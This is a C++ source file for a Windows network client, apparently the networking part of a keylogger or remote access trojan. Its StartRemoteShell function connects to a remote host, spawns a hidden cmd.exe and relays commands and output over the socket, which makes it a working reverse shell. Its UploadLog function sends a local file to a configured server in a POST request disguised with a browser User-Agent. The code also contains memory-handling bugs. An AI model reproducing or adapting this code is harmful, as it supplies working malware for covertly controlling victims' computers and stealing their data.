#include "NetClient.h"

#pragma comment(lib, "Ws2_32.lib")

#include <WinSock2.h>

#include <iostream>
#include <fstream>
#include <sstream>
using namespace std;

NetClient::NetClient()
{
	// ctor is private (not used)
}

NetClient::~NetClient()
{

}

NetClient::NetClient(const char* p_hostip, const char* p_port, const char* p_hostname, const char* p_scriptfile, const char* p_scriptvarname, const char* p_scriptvarval)
{
	isRemoveShellActive = false;
	ZeroMemory(&hostip, MAX_PATH);
	ZeroMemory(&port, MAX_PATH);
	ZeroMemory(&hostname, MAX_PATH);
	ZeroMemory(&scriptfile, MAX_PATH);
	ZeroMemory(&scriptvarname, MAX_PATH);
	ZeroMemory(&scriptvarval, MAX_PATH);

	strncpy_s(hostip, p_hostip, MAX_PATH);
	strncpy_s(port, p_port, MAX_PATH);
	strncpy_s(hostname, p_hostname, MAX_PATH);
	strncpy_s(scriptfile, p_scriptfile, MAX_PATH);
	strncpy_s(scriptvarname, p_scriptvarname, MAX_PATH);
	strncpy_s(scriptvarval, p_scriptvarval, MAX_PATH);
}

bool NetClient::IsRemoteShellConnected()
{
	return isRemoveShellActive;
}

void NetClient::StartRemoteShell(const char* rhost_ip, const char* rhost_port)
{
	HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, true };
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WSADATA wsa;

	// check version 2.2 is supported
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return;

	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd < 0) return;

	SOCKADDR_IN service;
	service.sin_family = AF_INET;
	service.sin_port = htons(atoi(rhost_port));

	LPHOSTENT host = gethostbyname(rhost_ip);
	if (!host) return;

	service.sin_addr = *((LPIN_ADDR)*host->h_addr_list);
	if (connect(fd, (SOCKADDR *)&service, sizeof(service)) < 0) 
		return;

	// we connected, update connection status
	isRemoveShellActive = true;

	// create pipes to cmd process
	DWORD tmp = 0;
	if(send(fd, "Lets chat\n", sizeof("Lets chat\n"), 0) == SOCKET_ERROR) goto closeSck;
	if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
		send(fd, "Error Creating Pipes For Remote Shell\r\nClosing Connection...", 60, 0);
		goto closeSck;
	}
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = stdoutWr;
	si.hStdError = stdoutWr;
	si.hStdInput = stdinRd;

	if(!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		send(fd, "Error Spawning Command Prompt. \r\nClosing Connection...", 52, 0);
		goto closeSck;
	}

	while(1)
	{
		// make sure (cmd) process is still running
		DWORD exitCode;
		GetExitCodeProcess(pi.hProcess, &exitCode);
		if(exitCode != STILL_ACTIVE)
			break;

		// check that there is stuff in the command line console
		char* buff;
		DWORD content_length;
		PeekNamedPipe(stdoutRd, NULL, 0, NULL, &content_length, NULL);
		if(content_length != 0)
		{
			// read content of cmd, and send it over the net
			buff = new char[content_length];
			ZeroMemory(buff, content_length);
			

			// calcualte how many iterations needed to send 256 byte sized packets for the current content_length
			int send_count = content_length / 256;
			int rem = content_length % 256; // send 255 byte packets (fast)

			if (send_count > 0)
			{
				// send read content in 256 packets
				while (send_count > 0)
				{
					ReadFile(stdoutRd, buff, 256, &tmp, NULL);
					send(fd, buff, 256, 0);
					send_count--;
				}

				// send remainder (if any)
				if (rem > 0)
				{
					ReadFile(stdoutRd, buff, rem, &tmp, NULL);
					send(fd, buff, rem, 0);
				}
			}
			else // content_length is less than 256, send it as it is
			{
				ReadFile(stdoutRd, buff, content_length, &tmp, NULL);
				send(fd, buff, content_length, 0);
			}
		}
		else
			goto closeSck;
        
		// receive remote commands (1024 bytes MAX) and execute them
		delete [] buff;
		buff = new char[1024];
		ZeroMemory(buff, 1024);

		int bytes_received = recv(fd, buff, 1024, 0);

		if (bytes_received <= 0) // connection has been closed, update status and exit
		{
			isRemoveShellActive = false;
			goto closeSck;
		}

		// append null-character(0) to properly defined the received string/command
		buff[bytes_received+1] = '\0';

		// send received command to cmd.exe process through the pipe
		WriteFile(stdinWr, buff, bytes_received, &tmp, NULL);

		// (avoid memory leak)
		delete [] buff;
   }
   closeSck:
       TerminateProcess(pi.hProcess, 0);
       CloseHandle(stdinRd);
       CloseHandle(stdinWr);
       CloseHandle(stdoutRd);
       CloseHandle(stdoutWr);
       closesocket(fd);
	   WSACleanup();
}

bool NetClient::UploadLog(char* filepath)
{
	WSADATA wsa;

	// check version 2.2 is supported
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return false;

	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd < 0) return false;

	SOCKADDR_IN service;
	service.sin_family = AF_INET;
	service.sin_port = htons(atoi(port));

	LPHOSTENT host = gethostbyname(hostip);
	if (!host) return false;

	service.sin_addr = *((LPIN_ADDR)*host->h_addr_list);
	if (connect(fd, (SOCKADDR *)&service, sizeof(service)) < 0) 
		return false;

	
	// read target file content & get file size information
	char* buffer;
	int tfsize;
	ifstream tfile(filepath, ios::in|ios::binary|ios::ate);
	tfile.unsetf(ios::skipws);
	if (tfile.is_open())
	{
		tfsize = tfile.tellg();
		buffer = new char[tfsize];
		memset(buffer, 0, tfsize);
		tfile.seekg(0, ios::beg);
		tfile.read(buffer, tfsize);
		tfile.close();
	}
	
	// prepare POST request
	stringstream ss_header;
	stringstream ss_body;
	stringstream ss_body_bin;
	string req_str;
	int body_size = 0;

	// header
	ss_header << "POST " << scriptfile << " HTTP/1.1\r\n";
	ss_header << "Host: " << hostname << "\r\n";
	ss_header << "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0\r\n";
	ss_header << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
	ss_header << "Connection: keep-alive\r\n";
	ss_header << "Content-Type: multipart/form-data; boundary=---------------------------187232569615063\r\n";

	// body
	ss_body << "-----------------------------187232569615063\r\n";
	ss_body << "Content-Disposition: form-data; " << scriptvarname << "=\"" << scriptvarval << "\"; filename=\"tmp\"\r\n";
	ss_body << "Content-Type: application/octet-stream\r\n\r\n";
	req_str = ss_body.str();
	ss_body_bin.write(req_str.c_str(), req_str.length());
	ss_body_bin.write(buffer, tfsize);
	ss_body.str("");
	ss_body.clear();
	ss_body.seekg(0, ios::beg);
	ss_body << "\r\n-----------------------------187232569615063\r\n";
	req_str = ss_body.str();
	ss_body_bin.write(req_str.c_str(), req_str.length());


	// set header content length
	ss_body_bin.seekg(0, ios::end);
	body_size = ss_body_bin.tellg();
	ss_body_bin.seekg(0, ios::beg);
	ss_header << "Content-Length: " << body_size << "\r\n\r\n";

	// send header
	req_str = ss_header.str();
	send(fd, req_str.c_str(), req_str.length(), 0);

	// reset buffer
	delete[] buffer;
	buffer = new char[body_size];
	memset(buffer, 0, body_size);

	// send body
	ss_body_bin.read(buffer, body_size);
	send(fd, buffer, body_size, 0);

	// cleanup
	delete [] buffer;
	closesocket(fd);
	WSACleanup();
	return true;
}
